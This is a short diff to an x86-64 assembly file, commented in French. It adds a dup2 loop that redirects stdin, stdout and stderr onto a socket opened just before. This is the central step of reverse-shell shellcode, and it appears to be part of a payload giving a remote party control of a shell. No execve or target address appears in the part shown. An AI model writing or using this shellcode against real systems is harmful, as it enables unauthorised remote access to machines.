@@ -37,3 +37,13 @@ _start:
     mov     rdx, 16         ; taille de sockaddr_in
     syscall
 
+    ; dup2(sockfd, 0/1/2) — redirige stdin, stdout, stderr
+    xor     rsi, rsi        ; compteur commence à 0
+dup_loop:
+    xor     rax, rax
+    mov     al, 33          ; syscall dup2 = 33
+    mov     rdi, r12        ; sockfd
+    syscall
+    inc     rsi             ; 0 → 1 → 2
+    cmp     rsi, 3
+    jne     dup_loop
